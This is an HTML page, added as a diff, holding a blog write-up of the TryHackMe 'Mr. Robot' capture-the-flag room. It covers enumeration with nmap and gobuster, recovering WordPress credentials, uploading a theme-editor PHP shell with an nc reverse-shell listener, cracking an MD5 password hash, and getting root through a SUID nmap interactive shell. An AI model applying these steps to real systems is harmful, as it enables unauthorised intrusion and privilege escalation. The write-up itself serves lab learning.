@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+<script type="text/javascript" src="https://platform-api.sharethis.com/js/sharethis.js#property=65103d22637e200019cd3518&product=sticky-share-buttons&source=platform" async="async"></script>
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Internal | tudor.mindra</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="Internal" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="THM - Internal" />
+<meta property="og:description" content="THM - Internal" />
+<link rel="canonical" href="https://tudm99.github.io/mrrobot.html" />
+<meta property="og:url" content="https://tudm99.github.io/mrrobot.html" />
+<meta property="og:site_name" content="tudor.mindra" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Internal" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"THM - Internal","headline":"Internal","url":"https://tudm99.github.io/mrrobot.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link rel="preload" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700&display=swap" as="style" type="text/css" crossorigin>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#157878">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="stylesheet" href="/assets/css/style.css?v=b46963317714bff433a3ee237bb2d9e1eaea31c9">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <a id="skip-to-content" href="#content">Skip to the content.</a>
+
+    <header class="page-header" role="banner">
+      <h1 class="project-name">Mr. Robot</h1>
+      <h2 class="project-tagline">THM - Mr. Robot</h2>
+      
+      
+    </header>
+<div class="sharethis-sticky-share-buttons"></div>
+    <main id="content" class="main-content" role="main">
+      <h2 id="enumeration">Enumeration</h2>
+
+<p>Nmap Scan:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report for 10.10.190.33
+Host is up (0.068s latency).
+Not shown: 65532 filtered tcp ports (no-response)
+PORT    STATE  SERVICE  VERSION
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+443/tcp open   ssl/http Apache httpd
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache
+| ssl-cert: Subject: commonName=www.example.com
+| Not valid before: 2015-09-16T10:45:03
+|_Not valid after:  2025-09-13T10:45:03
+</code></pre></div></div>
+<p>Gobuster:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/images
+/blog
+/rss               
+/sitemap             
+/login                
+/0                   
+/feed                 
+/video               
+/image                
+/atom                 
+/wp-content          
+/admin                
+/audio               
+/intro                
+/wp-login            
+/css                  
+/rss2                 
+/license            
+/wp-includes         
+/js                   
+/Image                
+/rdf                 
+/page1               
+/readme              
+/robots             
+/dashboard
+</code></pre></div></div>
+<p>/Robots:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User-agent: *
+fsocity.dic
+key-1-of-3.txt
+</code></pre></div></div>
+<p>The fsocity.dic file is a list of usernames that we could potentially use to bruteforce the wordpress login.</p>
+
+<p>/License:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?
+do you want a password or something?
+[REDACTED]
+</code></pre></div></div>
+
+<p>We found an ecrypted string. I’ll throw it in cyberchef and see what comes up.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>elliot:ER28-[REDACTED]
+</code></pre></div></div>
+<p>We found a login combination, so let’s try in on the wordpress login page.</p>
+
+<p>It worked!</p>
+
+<p>We’ll now upload the classic theme editor php shell, and see what’s what.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvnp 9002                
+Listening on 0.0.0.0 9002
+Connection received on 10.10.190.33 36548
+SOCKET: Shell has connected! PID: 2030
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+daemon@linux:~$ cd /home
+cd /home
+daemon@linux:/home$ ls
+ls
+robot
+daemon@linux:/home$ cd robot
+cd robot
+daemon@linux:/home/robot$ ls
+ls
+key-2-of-3.txt  password.raw-md5
+daemon@linux:/home/robot$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+cat: key-2-of-3.txt: Permission denied
+daemon@linux:/home/robot$ cat password.raw-md5
+cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+daemon@linux:/home/robot$ 
+</code></pre></div></div>
+<p>We found a hash for the password to the “robot” user.</p>
+
+<p>I deciphered it using hashes.com.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daemon@linux:/home/robot$ su robot
+su robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+robot@linux:~$
+robot@linux:find / -perm /4000 
+find / -perm /4000 
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+find: `/etc/ssl/private': Permission denied
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+</code></pre></div></div>
+<p>We have nmap with SUID permissions. Let’s take a look on gtfobins.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robot@linux:~$ nmap --interactive
+nmap --interactive
+
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h &lt;enter&gt; for help
+nmap&gt; !sh
+!sh
+# id
+id
+uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
+# cd /root
+cd /root
+# ls
+ls
+firstboot_done  key-3-of-3.txt
+# cat key-3-of-3.txt
+cat key-3-of-3.txt
+04787ddef27c3[REDACTED]
+</code></pre></div></div>
+<p>We got the root key!</p>
+
+<p>Good hunting o7</p>
+
+<p><a href="https://tryhackme.com/room/mrrobot">Try it out yourself!</a></p>
+
+<p><a href="./"><h2 id="goback">Go back</h2></a></p>
+
+      <footer class="site-footer">
+        
+      </footer>
+    </main>
+  </body>
+</html>
